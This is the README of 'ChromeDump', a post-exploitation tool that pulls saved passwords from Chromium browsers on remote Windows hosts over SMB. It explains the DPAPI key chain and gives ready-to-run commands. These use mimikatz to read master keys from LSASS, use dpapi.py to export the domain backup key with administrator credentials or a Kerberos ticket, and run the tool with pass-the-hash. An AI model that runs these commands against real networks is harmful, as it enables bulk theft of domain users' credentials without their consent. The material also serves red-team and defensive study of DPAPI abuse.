# ChromeDump

A Python tool that extracts and decrypts saved credentials from Chromium-based browsers on remote Windows machines, over SMB, using the Windows DPAPI domain backup key (PVK). No shellcode, no agent, no interactive session on the target required.

## The problem

When a Chromium browser saves a password, it encrypts it with AES-256-GCM. The AES key is itself encrypted by Windows DPAPI and stored in a file called `Local State`. DPAPI encrypts that key using a per-user master key, and the master key is stored encrypted on disk under `AppData\Roaming\Microsoft\Protect\<SID>\`.

To recover plaintext credentials from a remote machine, you need to break through that encryption chain from the outside.

There are two ways to do it.

### Method 1: LSASS (sekurlsa::dpapi)

When a user logs on interactively (type 2 logon, console or RDP), Windows decrypts and caches the master key in LSASS memory for the duration of the session. Mimikatz can extract it directly:

```
mimikatz # sekurlsa::dpapi
```

This gives you the raw master key bytes without touching the disk encryption at all. The limitation is that it requires a live interactive session and LSASS access, which means either a local admin shell on a machine where the target user is currently logged in, or a memory dump from one.

### Method 2: Domain backup key (this tool)

Every master key file on disk contains two encrypted copies of the master key:

* **MasterKey section**: encrypted symmetrically using a key derived from the user's logon password. Requires the current password. Breaks if the password has changed since the master key was created.
* **DomainKey section**: encrypted asymmetrically using an RSA-2048 public key belonging to the domain. This section can always be decrypted offline with the corresponding private key, regardless of the user's password, regardless of whether the user is logged in.

The RSA private key (the domain backup key) lives exclusively in the DC's LSA secrets and is never distributed. When a domain user's master key is first created, the DC encrypts it with this public key and writes the result into the `DomainKey` section.

With Domain Admin access, you can export that private key. Once you have it, you can decrypt any domain user's master key offline over SMB, without touching LSASS and without needing the user's password or an active session.

## Workflow

```
Domain Controller
      |
      | dpapi.py backupkeys --export
      v
  [PVK file]  <-- RSA-2048 private key, decrypts any domain user's master key
      |
      |  RSA-PKCS1v1.5 decrypt of DomainKey section
      v
  [Raw master key bytes]
      |
      |  DPAPI_BLOB.decrypt(masterkey)  via impacket
      v
  [Chrome AES-256 key]  <-- unwrapped from Local State
      |
      |  AES-256-GCM decrypt per row
      |  nonce = enc[3:15],  ciphertext = enc[15:]  (v10 prefix, Chrome 80+)
      v
  [Plaintext passwords]

Target machine (SMB)
      |
      +-- C$\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
      +-- C$\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State
      +-- C$\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

The DPAPI blob inside `Local State` embeds the GUID of the master key it was encrypted with. The tool reads that GUID and looks up the matching master key file by name directly.

## Why not the existing tools

* **SharpChrome /rpc** contacts the DC at runtime via MS-BKRP to decrypt master keys. This requires a forwardable Kerberos ticket, which is often not available on the path from a compromised workstation.
* **SharpChrome /ntlm** derives the master key from the current NT hash. Only works if the password has not changed since the master key was created.
* **dploot** automates this full chain but crashes with `KeyError: 'profiles_order'` on old Chrome installations (pre-87, common on Windows 7) because the `Local State` JSON structure differs in older versions.
* **Manual approach** requires copying `Login Data` and `Local State` to a writable path first because tools like `smbclient.py` cannot handle paths with spaces, and the `Protect` directory is hidden. Doing this across multiple profiles is slow.

## Before using the tool

The only prerequisite is the domain backup key exported as a PVK file. This requires Domain Admin access to a domain controller.

### Export the backup key

```bash
dpapi.py backupkeys --export \
    -t 'Administrator@DC01.corp.local' \
    -p 'Password123' \
    -dc-ip 10.0.0.1
```

With a Kerberos ticket (pass-the-hash or ticket impersonation):

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ccache

dpapi.py backupkeys --export \
    -t 'Administrator@DC01.corp.local' \
    -k -no-pass \
    -dc-ip 10.0.0.1
```

```
[*] Exporting domain backupkey to file G$BCKUPKEY_<GUID>.pvk
```

That PVK file is all the tool needs. Pass it via `--pvk`.

## Installation

```bash
pip install -r requirements.txt
```

## Usage

```
python3 chromedump.py -t TARGET -u USERNAME --pvk BACKUP_KEY.pvk [options]

required:
  -t, --target      Target IP or hostname
  -u, --username    SMB username
  --pvk             Path to the domain backup key PVK file

authentication:
  -p, --password    Cleartext password
  -H, --hashes      :NTHASH or LMHASH:NTHASH

optional:
  -d, --domain      Windows domain name
```

Pass-the-hash example:

```bash
python3 chromedump.py \
    -t 192.168.1.50 \
    -d CORP \
    -u Administrator \
    -H :fc525c9683e8fe067095ba2ddc971889 \
    --pvk 'G$BCKUPKEY_<GUID>.pvk'
```

## References

* MS-DPAPI specification: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dpapi
* MS-BKRP BackupKey Remote Protocol: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp
* impacket DPAPI module: https://github.com/fortra/impacket/blob/master/impacket/dpapi.py
